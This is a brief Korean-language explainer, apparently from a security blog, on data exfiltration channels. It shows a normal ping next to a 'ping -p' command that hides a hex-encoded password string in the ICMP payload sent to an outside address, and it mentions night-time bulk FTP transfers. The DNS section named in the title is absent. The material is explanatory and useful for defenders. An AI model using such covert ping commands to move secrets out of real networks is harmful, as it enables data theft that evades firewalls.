#2. ICMP 터널링, DNS 유출, FTP 대용량 전송

ICMP 터널링

ICMP Echo Request(ping)의 데이터 필드는 원래 비어 있거나 패딩 데이터만 들어갑니다. 해커는 여기에 유출 데이터를 삽입합니다. 대부분의 방화벽이 ICMP를 허용하고, 데이터 필드를 검사하지 않습니다.

# 정상 ping
ping -c 1 8.8.8.8
Data: 0x00000000000000000000 (패딩)
# ICMP 터널링 (데이터 은닉)
ping -p "7061737377643d4032314" 8.8.8.8
Data: 0x7061737377643d403231 (passwd=@21)

FTP 대용량 유출

외부 FTP 서버로 야간에 수 GB 단위 파일 전송. 로그 미확인 시 탐지 불가
